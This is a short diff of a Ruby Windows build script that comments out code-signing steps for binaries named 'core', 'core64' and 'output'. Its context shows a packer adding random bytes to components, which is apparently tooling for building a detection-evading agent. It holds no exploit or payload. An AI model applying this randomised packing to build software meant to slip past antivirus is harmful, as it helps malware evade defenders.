@@ -114,8 +114,8 @@ class BuildWindows < Build
     CrossPlatform.exec path('packer64'), "#{path('core64')}"
 
     # signature for the patched code
-    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core')}" if to_be_signed?(params)
-    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core64')}" if to_be_signed?(params)
+    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core')}" if to_be_signed?(params)
+    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core64')}" if to_be_signed?(params)
 
     # add random bytes to codec, rapi and sqlite
     CrossPlatform.exec path('packer'), "#{path('codec')}"
@@ -217,7 +217,7 @@ class BuildWindows < Build
     return if @cooked
 
     # perform the signature
-    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('output')}" if to_be_signed?(params)
+    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('output')}" if to_be_signed?(params)
   end
 
   def pack(params)
